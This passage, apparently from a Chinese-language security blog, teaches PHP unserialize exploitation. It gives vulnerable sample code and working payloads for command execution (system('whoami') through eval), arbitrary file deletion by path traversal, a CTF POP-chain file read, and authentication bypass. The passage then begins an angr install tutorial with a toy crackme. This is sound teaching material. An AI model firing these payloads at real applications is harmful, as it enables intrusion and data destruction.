class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PHPObjectInjection</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$inject</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-comment"># nothing todo here</span><br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;inject))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;inject);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hz&#x27;</span>]))&#123;  <br>        <span class="hljs-variable">$varrr</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hz&#x27;</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$varrr</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>.<span class="hljs-variable">$varrr</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&quot; - &quot;</span>.<span class="hljs-variable">$varrr</span>[<span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment"># nothing happens here</span><br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>比如我们想执行 <code>whoami</code> 指令，我们构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PHPObjectInjection</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$inject</span> = <span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;inject))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;inject);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PHPObjectInjection</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以得到 Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;PHPObjectInjection&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;inject&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>此时我们可以看到输出执行 <code>whoami</code> 后的结果。</p><h1 id="destruct-in-the-unserialize-function"><a href="#destruct-in-the-unserialize-function" class="headerlink" title="__destruct() in the unserialize function"></a>__destruct() in the unserialize function</h1><p>源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example1</span></span><br><span class="hljs-class"></span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$cache_file</span>;<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>      <span class="hljs-comment">// some PHP code...</span><br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>      <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;/var/www/cache/tmp/<span class="hljs-subst">&#123;$this-&gt;cache_file&#125;</span>&quot;</span>;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// some PHP code...</span><br><br><span class="hljs-variable">$user_data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><br><span class="hljs-comment">// some PHP code...</span><br></code></pre></td></tr></table></figure><p>攻击者可能能够通过<a href="https://owasp.org/www-community/vulnerabilities/Path_Traversal">路径遍历</a>攻击删除任意文件，例如，请求以下URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://testsite.com/vuln.php?data=O:8:&quot;Example1&quot;:1:&#123;s:10:&quot;cache_file&quot;;s:15:&quot;../../index.php&quot;;&#125;<br></code></pre></td></tr></table></figure><h1 id="toString-in-the-unserialize-function"><a href="#toString-in-the-unserialize-function" class="headerlink" title="__toString() in the unserialize function"></a>__toString() in the unserialize function</h1><p>使用”POP链” 执行<a href="https://owasp.org/www-community/vulnerabilities/SQL_Injection">SQL注入</a>攻击，例如通过利用<code>__toString</code>方法</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example3</span></span><br><span class="hljs-class"></span>&#123;<br>   <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>      <span class="hljs-comment">// some PHP code...</span><br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj)) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getValue</span>();<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// some PHP code...</span><br><br><span class="hljs-variable">$user_data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><br><span class="hljs-comment">// some PHP code...</span><br></code></pre></td></tr></table></figure><h1 id="POP链的寻找"><a href="#POP链的寻找" class="headerlink" title="POP链的寻找"></a>POP链的寻找</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in flag.php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>            <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;pop.php&#x27;</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&#x27;Welcome&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/https/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/https/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;pop.php&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-string">&#x27;pop.php&#x27;</span>);<br>        <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>先理一理关系，我们既然要读 <code>flag.php</code> ，那就需要找到读文件的地方，比如 <code>Show</code> 类里面的 <code>highlight_file()</code> 和 <code>Read</code> 类里面的 <code>file_get_contents()</code>，很明显这里需要用到 <code>file_get_contents()</code>，要用到这个函数，前提是调用 <code>file_get()</code> 函数，这样就可以知道需要触发 <code>__invoke()</code>，这个魔术方法是当以调用函数的方式调用一个对象时的回应方法，我们可以跟到 <code>Test</code> 类里面的 <code>__get()</code> 函数，这个魔术方法又是读取不可访问属性的值时会被调用，我们可以来到 <code>Show</code> 类的 <code>__toString()</code> 函数，这里是调用了 <code>str</code> 这个数组里 key 为<code>str</code> 的值，也就是 <code>source</code>，那么将它指向 <code>Test</code> 类，让它可以触发 <code>__get()</code>，好了，既然触发了 <code>__toString</code> 那就是这个类在某处被当作字符串使用，在 <code>preg_match()</code> 函数里可以看到，这里 <code>source</code> 是会被当成字符串执行，也就是在 <code>__wakeup()</code> 里。这样 <code>pop</code>链就是 <code>Show-&gt;__wakeup()-&gt;__toString-&gt;Test-&gt;__get()-&gt;Read-&gt;__invoke()-&gt;file_get()</code>。</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>    <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Read</span>();<br><br>    <span class="hljs-variable">$b</span>-&gt;p = <span class="hljs-variable">$c</span>;<br>    <span class="hljs-variable">$a</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>] = <span class="hljs-variable">$b</span>;<br>    <span class="hljs-variable">$a</span>-&gt;source = <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-comment">//O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:4:&quot;Read&quot;:1:&#123;s:3:&quot;var&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传参进去即可。</p><h1 id="Authentication-bypass"><a href="#Authentication-bypass" class="headerlink" title="Authentication bypass"></a>Authentication bypass</h1><h2 id="Type-juggling"><a href="#Type-juggling" class="headerlink" title="Type juggling"></a>Type juggling</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;auth&#x27;</span>]);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$adminName</span> &amp;&amp; <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$adminPassword</span>) &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-literal">false</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>因为 <code>true == &quot;str&quot;</code> is true.</p><p>所以我们传布尔值即可：</p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;b:<span class="hljs-number">1</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;b:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="Object-reference"><a href="#Object-reference" class="headerlink" title="Object reference"></a>Object reference</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Object</span></span><br><span class="hljs-class">        </span>&#123;<br>            <span class="hljs-keyword">var</span> <span class="hljs-variable">$guess</span>;<br>            <span class="hljs-keyword">var</span> <span class="hljs-variable">$secretCode</span>;<br>        &#125;<br><br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;input&#x27;</span>]);<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$obj</span>) &#123;<br>        <span class="hljs-variable">$obj</span>-&gt;secretCode = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">500000</span>,<span class="hljs-number">999999</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$obj</span>-&gt;guess === <span class="hljs-variable">$obj</span>-&gt;secretCode) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Win&quot;</span>;<br>        &#125;<br>    &#125;*/<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Object</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$guess</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$secretCode</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-variable">$a</span>-&gt;guess = &amp;<span class="hljs-variable">$a</span>-&gt;secretCode; <span class="hljs-comment">//令guess为指向secretCode的指针</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Object&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;secretCode&quot;</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;guess&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python的二进制分析框架angr</title>
    <link href="/2020/02/22/angr/"/>
    <url>/2020/02/22/angr/</url>
    
    <content type="html"><![CDATA[<p>作为一个 Web 狗有时候简单的逆向或者苦力活还是可以做做的，但是本着能白嫖不自己干为主的精神，发现了 <code>angr</code>，记录一下一些简单的应用。</p><p><a href="https://github.com/angr/angr">官方Github地址</a></p><h1 id="安装-基于Kali-64"><a href="#安装-基于Kali-64" class="headerlink" title="安装(基于Kali 64)"></a>安装(基于Kali 64)</h1><h2 id="安装-virtualenv"><a href="#安装-virtualenv" class="headerlink" title="安装 virtualenv"></a>安装 virtualenv</h2><blockquote><p>pip install virtualenv</p></blockquote><h2 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h2><blockquote><p>mkdir angr_enviroment &amp;&amp; cd angr_enviroment&#x2F;</p></blockquote><h2 id="创建独立运行的python运行环境"><a href="#创建独立运行的python运行环境" class="headerlink" title="创建独立运行的python运行环境"></a>创建独立运行的python运行环境</h2><p>命名为 <code>venv</code>:(因为安装angr的时候总是会因为python环境问题出现各种错误）</p><blockquote><p>virtualenv –no-site-packages venv</p></blockquote><p>创建一个独立的python运行环境，我们还加上了一个参数<code>--no-site-packages</code>,这样已经安装到当前系统的所有第三方包都不会复制过来，我们就得到了一个不带任何第三方包的“干净”的python运行环境。新建的python环境被放到了当前目录下的venv目录，有了venv这个python环境，可以用source进入该环境</p><h2 id="进入对应的环境"><a href="#进入对应的环境" class="headerlink" title="进入对应的环境"></a>进入对应的环境</h2><blockquote><p>source venv&#x2F;bin&#x2F;activate</p></blockquote><p>就可以正常安装各种第三方包，并运行python命令，在venv环境下，用pip安装的包都会被安装到venv这个环境下，系统python环境不受任何影响，也就是说,venv环境是专门针对anger_enviroment这个应用创建的。</p><h2 id="安装angr"><a href="#安装angr" class="headerlink" title="安装angr"></a>安装angr</h2><blockquote><p>pip install angr</p></blockquote><h2 id="退出当前venv环境"><a href="#退出当前venv环境" class="headerlink" title="退出当前venv环境"></a>退出当前venv环境</h2><p>使用<code>deactive</code>命令：<code>deactive</code>，这个时候会回到正常的环境。</p><h1 id="对于简单的二进制程序验证的计算"><a href="#对于简单的二进制程序验证的计算" class="headerlink" title="对于简单的二进制程序验证的计算"></a>对于简单的二进制程序验证的计算</h1><p>环境：<code>Kali Linux 2019.3</code>，<code>Python 2.7</code></p><p>以自己写的 elf 为例，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-comment">// wust&#123;i_l0ve_y0u&#125;</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">35</span>];<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input your flag\n&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); ++i)<br>&#123;<br>buf[i] ^= <span class="hljs-number">0xe</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(buf,<span class="hljs-string">&quot;y&#123;&#125;zugQb&gt;xkQw&gt;&#123;s&quot;</span>))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congratulations!\n&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;go out\n&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们首先用 IDA 分析一下程序，可以看到，对输入进行一顿计算后(异或0xe)，与字符串对比，如果正确的话即输出 <code>Congratulations!</code>。<br><img 